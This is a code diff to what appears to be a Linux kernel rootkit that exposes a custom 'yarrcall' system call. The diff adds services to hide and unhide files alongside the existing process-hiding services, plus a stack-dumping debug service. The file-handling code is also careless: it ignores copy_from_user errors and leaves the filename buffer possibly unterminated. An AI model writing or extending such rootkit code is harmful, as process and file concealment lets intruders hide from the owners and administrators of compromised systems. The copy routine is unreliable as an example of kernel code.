@@ -3,6 +3,7 @@
 #include "yarrcall.h"
 #include "log.h"
 #include "hidepid.h"
+#include "hidefile.h"
 
 // A map that maps the integer value of svc into a string with its name.
 // Note that enum YARRCALL_SERVICES starts at 1, hence the first NULL.
@@ -10,7 +11,10 @@ const char *__YARRCALL_SERVICE_MAP[] = {
     NULL,           
     "HIDE_PID",
     "UNHIDE_PID",
-    "__GET_PROC_INFO"
+    "HIDE_FILE",
+    "UNHIDE_FILE",
+    "__GET_PROC_INFO",
+    "__SHOW_STACKS"
 };
 
 static const char * __enum2str(enum YARRCALL_SERVICE svc) {
@@ -21,8 +25,17 @@ static const char * __enum2str(enum YARRCALL_SERVICE svc) {
         case UNHIDE_PID:
             return __YARRCALL_SERVICE_MAP[UNHIDE_PID];
 
+        case HIDE_FILE:
+            return __YARRCALL_SERVICE_MAP[HIDE_FILE];
+
+        case UNHIDE_FILE:
+            return __YARRCALL_SERVICE_MAP[UNHIDE_FILE];
+
         case __GET_PROC_INFO:
             return __YARRCALL_SERVICE_MAP[__GET_PROC_INFO];
+
+        case __SHOW_STACKS:
+            return __YARRCALL_SERVICE_MAP[__SHOW_STACKS];
 
         default:
             return NULL;
@@ -55,6 +68,7 @@ asmlinkage long entry_yarrcall(struct pt_regs *regs) {
 long do_yarrcall(int svc, YarrcallArgs_t __user *args) {
     YarrcallArgs_t local_args;
     int err;
+    char to[128];
 
     yarr_log("Requested service %s", __enum2str(svc));
 
@@ -82,6 +96,16 @@ long do_yarrcall(int svc, YarrcallArgs_t __user *args) {
             err = unhide_pid(local_args.hidepid_args.pid);
             break;
 
+        case HIDE_FILE:
+            copy_from_user(to, local_args.hidefile_args.fname, 127);
+            err = hide_file(to);
+            break;
+
+        case UNHIDE_FILE:
+            copy_from_user(to, local_args.hidefile_args.fname, 127);
+            err = unhide_file(to);
+            break;
+
         case __GET_PROC_INFO:
             err = __get_proc_info(&local_args.getprocinfo_args);
             // This service writes information into the structure, now we have
@@ -90,6 +114,11 @@ long do_yarrcall(int svc, YarrcallArgs_t __user *args) {
             if (err) {
                 yarr_log("Error copying data to userspace");
             }
+
+            break;
+
+        case __SHOW_STACKS:
+            show_tasks_stacks();
             break;
 
         default:
